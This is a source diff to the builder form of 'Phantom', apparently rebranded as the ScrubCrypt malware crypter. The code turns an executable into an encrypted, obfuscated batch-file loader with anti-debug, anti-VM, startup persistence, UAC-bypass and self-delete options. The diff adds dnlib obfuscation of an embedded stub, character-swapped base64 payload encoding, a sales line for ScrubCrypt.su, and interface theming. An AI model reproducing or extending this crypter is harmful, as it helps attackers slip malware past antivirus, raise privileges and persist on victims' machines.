@@ -12,17 +12,24 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using dnlib.DotNet;
+using MaterialSkin;
+using MaterialSkin.Controls;
 using Microsoft.CSharp;
 using Phantom.Properties;
 using static Phantom.Utils;
 
+
 namespace Phantom
 {
-    public partial class PhantomMain : Form
+    public partial class PhantomMain : MaterialForm
     {
         public PhantomMain()
         {
             InitializeComponent();
+            var materialSkinManager = MaterialSkinManager.Instance;
+            materialSkinManager.AddFormToManage(this);
+            materialSkinManager.Theme = MaterialSkinManager.Themes.LIGHT;
+            materialSkinManager.ColorScheme = new ColorScheme(Primary.BlueGrey800, Primary.BlueGrey900, Primary.BlueGrey500, Accent.LightBlue200, TextShade.WHITE);
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -32,7 +39,6 @@ namespace Phantom
             {
                 UnpackSettings(obj);
             }
-            Task.Factory.StartNew(CheckVersion);
             UpdateKeys(sender, e);
         }
 
@@ -51,7 +57,7 @@ namespace Phantom
             {
                 return;
             }
-            textBox1.Text = ofd.FileName;
+           textBox1.Text = ofd.FileName;
         }
 
         private void buildButton_Click(object sender, EventArgs e) => Crypt();
@@ -137,6 +143,7 @@ namespace Phantom
         }
 
         // Method to create a crypted batch file from a executable
+        // Method to create a crypted batch file from a executable
         private void Crypt()
         {
             // Disable button to prevent multiple executions
@@ -148,6 +155,7 @@ namespace Phantom
             // Clear items from listBox2
             listBox2.Items.Clear();
 
+            listBox2.Items.Add(@"Buy ScrubCrypt at ScrubCrypt.su For more constant updates.");
             // Call UpdateKeys method with null arguments to update and refresh the AES keys
             UpdateKeys(null, null);
 
@@ -196,6 +204,7 @@ namespace Phantom
                 isnetasm = true;
             }
 
+
             // If input file is not a .NET assembly, convert it to shellcode and update the payload byte array
             if (!isnetasm)
             {
@@ -234,7 +243,7 @@ namespace Phantom
             listBox2.Items.Add(@"Creating stub...");
 
             // Generate C# stub code
-            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, antiDebug.Checked, antiVM.Checked, startup.Checked, uacBypass.Checked, !isnetasm, rng);
+            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, antiDebug.Checked, antiVM.Checked, startup.Checked, uacBypass.Checked, runas.Checked, selfDelete.Checked, !isnetasm, rng);
 
             // Add message to listBox2
             listBox2.Items.Add(@"Building stub...");
@@ -317,44 +326,31 @@ namespace Phantom
             CSharpCodeProvider csc2 = new CSharpCodeProvider();
 
             // Specify compiler parameters for second compilation (Bypass Stub)
-            CompilerParameters parameters2 = new CompilerParameters(new[] { @"mscorlib.dll", @"System.Core.dll", @"System.dll", @"System.Management.dll", @"Microsoft.VisualBasic.dll" }, tempfile)
+            CompilerParameters parameters2 = new CompilerParameters(new[] { @"mscorlib.dll", @"System.Core.dll", @"System.dll", @"System.Management.dll" }, tempfile)
             {
                 GenerateExecutable = true,
                 CompilerOptions = @"-optimize -unsafe",
                 IncludeDebugInformation = false
             };
 
-            // Compile embedded BStub.cs file
-            string BStub_Str = GetEmbeddedString(@"Phantom.Resources.BStub.cs");
-            if (fileType == FileType.NET64)
-            {
-                BStub_Str = "#define x64\n" + BStub_Str;
-            }
-            else if (fileType == FileType.x64)
-            {
-                BStub_Str = "#define x64\n" + BStub_Str;
-            }
-            CompilerResults results2 = csc2.CompileAssemblyFromSource(parameters2, BStub_Str);
 
-            // Check for compilation errors
-            if (results2.Errors.Count > 0)
-            {
-                // Delete temporary files
-                File.Delete(@"payload.txt");
-                File.Delete(tempfile);
+            byte[] sex = ExtractResource(@"Phantom.PHB.bin");
+            ModuleDef md2 = ModuleDefMD.Load(sex);
+            Obfuscate.Obfuscate.clean_asm(md2);
+            Obfuscate.Obfuscate.obfuscate_namespace(md2);
+            Obfuscate.Obfuscate.obfuscate_methods(md2);
+            Obfuscate.Obfuscate.obfuscate_strings(md2);
+            Obfuscate.Obfuscate.obfuscate_assembly_info(md2);
+            Obfuscate.Obfuscate.obfuscate_classes(md2);
 
-                // Show error message
-                MessageBox.Show(@"BStub build error!", @"Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            MemoryStream ms2 = new MemoryStream();
+            md2.Write(ms2);
+            ms2.Position = 0;
 
-                // Re-enable build button
-                buildButton.Enabled = true;
+            byte[] obfuscatedBytes = ms2.ToArray();
 
-                // Exit function
-                return;
-            }
-
-            // Encrypt and compress stub bytes
-            byte[] bstubbytes = Encrypt(mode, Compress(File.ReadAllBytes(tempfile)), _key, _iv);
+            byte[] compressedBytes = Compress(obfuscatedBytes);
+            byte[] bstubbytes = Encrypt(mode, compressedBytes, _key, _iv);
 
             // Delete temporary files
             File.Delete(@"payload.exe");
@@ -369,15 +365,13 @@ namespace Phantom
             // Add message to listBox2
             listBox2.Items.Add(@"Creating batch file...");
 
+            string ContentLineID = Utils.RandomString(20, rng);
+
             // Generate batch file content
-            string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, selfDelete.Checked, runas.Checked, fileType, rng);
+            string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, fileType, ContentLineID, rng);
 
-            // Split content into lines
-            List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
-
-            // Insert encrypted stub bytes into content lines at random position
-            content_lines.Insert(rng.Next(0, content_lines.Count), $":: {Convert.ToBase64String(bstubbytes)}\\{Convert.ToBase64String(stub_enc)}");
-            content = string.Join(Environment.NewLine, content_lines);
+            // Insert encrypted stub bytes into content lines at last line
+            content = content + Environment.NewLine + ContentLineID + $"{Convert.ToBase64String(bstubbytes).Replace(@"/", @"#").Replace(@"A", @"@")}\\{Convert.ToBase64String(stub_enc).Replace(@"/", @"#").Replace(@"A", @"@")}";
 
             // Initialize SaveFileDialog
             SaveFileDialog sfd = new SaveFileDialog()
@@ -407,31 +401,6 @@ namespace Phantom
             buildButton.Enabled = true;
         }
 
-        private void CheckVersion()
-        {
-            try
-            {
-                WebClient wc = new WebClient();
-                string latestversion = wc.DownloadString("https://raw.githubusercontent.com/C5Hackr/Phantom/main/version").Trim();
-                wc.Dispose();
-                if (File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion"))
-                {
-                    string currentversion = File.ReadAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion").Trim();
-                    if (currentversion != latestversion)
-                    {
-                        DialogResult result = MessageBox.Show($"Phantom {currentversion} is outdated. Download {latestversion}?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
-                        if (result == DialogResult.Yes)
-                        {
-                            Process.Start("https://github.com/C5Hackr/Phantom/releases/tag/" + latestversion);
-                        }
-                    }
-                }
-                File.WriteAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion", latestversion);
-            }
-            catch
-            {
-            }
-        }
 
         private static string key1 = @"";
 
